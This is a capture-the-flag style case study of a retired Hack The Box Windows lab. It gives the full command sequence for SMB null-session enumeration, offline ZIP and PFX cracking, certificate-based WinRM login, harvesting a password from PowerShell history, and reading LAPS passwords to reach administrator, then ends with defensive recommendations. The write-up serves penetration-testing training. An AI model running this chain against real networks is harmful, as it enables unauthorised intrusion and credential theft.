---
title: "Active Directory Certificate Abuse via SMB Share Disclosure"
description: "An SMB share exposes a protected certificate archive, and PowerShell history leaks a service account with LAPS read access."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - active-directory-certificate-services
  - credential-abuse
---

## Summary

This retired Easy Windows Active Directory lab demonstrates credential exposure through SMB share misconfiguration and PowerShell history leakage. An unauthenticated SMB share reveals a password-protected ZIP archive containing a `.pfx` certificate. Offline cracking of both the archive and certificate passphrase yields WinRM credentials. Post-exploitation PowerShell history analysis exposes a service-account password with LAPS read permissions, enabling access through a managed local administrator password. Target, account, and path details are replaced with role-based placeholders.

## Context and Objective

- **Target OS:** Windows (Active Directory)
- **Difficulty:** Easy
- **Environment:** Domain `<DIRECTORY_DOMAIN>`, directory server `<DIRECTORY_SERVER>`
- **Key services:** DNS (53), Kerberos (88), LDAP (389), SMB (445), WinRM HTTPS (5986)
- **Objective:** Escalate from unauthenticated access to directory-level administration.

Note: WinRM operates on port 5986 (HTTPS) rather than the default 5985 (HTTP), indicating certificate-based authentication is configured.

## Approach and Evidence

### Stage 1: SMB Enumeration — Discovering the Archive

SMB enumeration with null-session access reveals a readable `<READABLE_SHARE>` share. Recursive download exposes a directory structure containing LAPS documentation and a WinRM backup archive.

```bash
nxc smb <TARGET_IP> -u 'a' -p '' --shares
```

```
ADMIN$        NO ACCESS
C$            NO ACCESS
IPC$          READ
NETLOGON      NO ACCESS
<READABLE_SHARE> READ
SYSVOL        NO ACCESS
```

The `<ARCHIVE_DIRECTORY>` subdirectory contains `<WINRM_ARCHIVE>` — the primary attack surface. The `<DOCUMENTATION_DIRECTORY>` subdirectory contains LAPS installation files and documentation, confirming LAPS deployment in the domain.

```bash
nxc smb <TARGET_IP> -u 'a' -p '' -M spider_plus
smbclient //<TARGET_IP>/Shares -U '%' -c 'recurse ON; prompt OFF; mget *'
```

### Stage 2: ZIP and PFX Cracking

The archive is encrypted with ZipCrypto Deflate. Conversion to `john` format enables offline dictionary cracking.

```bash
7z l -slt <WINRM_ARCHIVE> | grep -i "method\|encrypt"
zip2john <WINRM_ARCHIVE> > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Cracked password: `<ARCHIVE_PASSWORD>`.

Extraction yields `<CERTIFICATE_BUNDLE>` — a PKCS#12 certificate bundle intended for WinRM authentication. The PFX itself has a separate passphrase, also crackable offline.

```bash
pfx2john <CERTIFICATE_BUNDLE> > pfx.hash
john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

PFX passphrase: `<PFX_PASSPHRASE>`.

Certificate components extracted:

```bash
openssl pkcs12 -in <CERTIFICATE_BUNDLE> -clcerts -nokeys -passin pass:<PFX_PASSPHRASE> -out <CERTIFICATE_FILE>
openssl pkcs12 -in <CERTIFICATE_BUNDLE> -nocerts -nodes -passin pass:<PFX_PASSPHRASE> -out <PRIVATE_KEY_FILE>
```

### Stage 3: WinRM Authentication — User Access

The extracted certificate and private key enable WinRM authentication as `<INITIAL_USER>` without a password.

```bash
evil-winrm -i <TARGET_IP> --cert-pem <CERTIFICATE_FILE> --priv-key-pem <PRIVATE_KEY_FILE>
```

The notes report initial user-level access.

### Stage 4: PowerShell History Forensics — Service Account Credential

Post-exploitation, PowerShell's PSReadLine history file reveals a plaintext service account password passed as a command-line argument.

```powershell
$HistPath = "<POWERSHELL_HISTORY_PATH>"
Get-Content $HistPath
```

Key history entries show `<SERVICE_ACCOUNT>` credentials in cleartext:

```powershell
$p = ConvertTo-SecureString '<SERVICE_ACCOUNT_PASSWORD>' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('<SERVICE_ACCOUNT>', $p)
invoke-command -computername <LOCAL_HOST> -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
```

Credential validated:

```bash
nxc winrm <TARGET_IP> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_ACCOUNT_PASSWORD>'
```

### Stage 5: LAPS Abuse — Domain Administrator

LAPS (Local Administrator Password Solution) stores per-machine local admin passwords in the `ms-Mcs-AdmPwd` AD attribute. The `<SERVICE_ACCOUNT>` account has read access to this attribute.

```bash
evil-winrm -i <TARGET_IP> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_ACCOUNT_PASSWORD>'
```

```powershell
Get-ADComputer <DIRECTORY_SERVER> -Property 'ms-Mcs-AdmPwd' | Select-Object 'ms-Mcs-AdmPwd'
```

The directory server's local administrator password is retrieved. Authentication as `<LOCAL_ADMINISTRATOR>` confirms directory-level administrative access:

```bash
evil-winrm -i <TARGET_IP> -u '<LOCAL_ADMINISTRATOR>' -p '<LAPS_ADMIN_PASSWORD>'
```

The notes report administrative access.

## Challenges and Decisions

The certificate-based WinRM authentication was a new pathway compared to typical password-based access. Identifying the `.pfx` file as the credential and recognizing that both the archive and certificate passphrase could be cracked offline were critical decision points. The PowerShell history file (`ConsoleHost_history.txt`) is an often-overlooked forensic artifact — commands with plaintext passwords are logged verbatim by default since PSReadLine's introduction.

## Outcome

Directory-level administrative access was achieved through a five-stage attack chain: unauthenticated SMB share access → offline credential cracking → certificate-based authentication → PowerShell history credential extraction → LAPS abuse. The root cause was insufficient access control on the SMB share combined with insecure credential storage practices.

## Lessons and Recommendations

- **Protect certificate archives with high-entropy passphrases.** PFX files should never be stored on network shares accessible to unauthenticated users. Use the Windows certificate store rather than file-based certificates for WinRM authentication.

- **Never pass credentials as command-line arguments.** PowerShell captures all command text in history and transcript logs. Use `Get-Credential` for interactive authentication or Windows Credential Manager for programmatic access.

- **Scope LAPS read permissions minimally.** The `ms-Mcs-AdmPwd` attribute should be readable only by accounts requiring break-glass access — typically a specific IT operations group, not deployment service accounts. Audit LAPS permissions regularly.

## References

- Microsoft LAPS Documentation
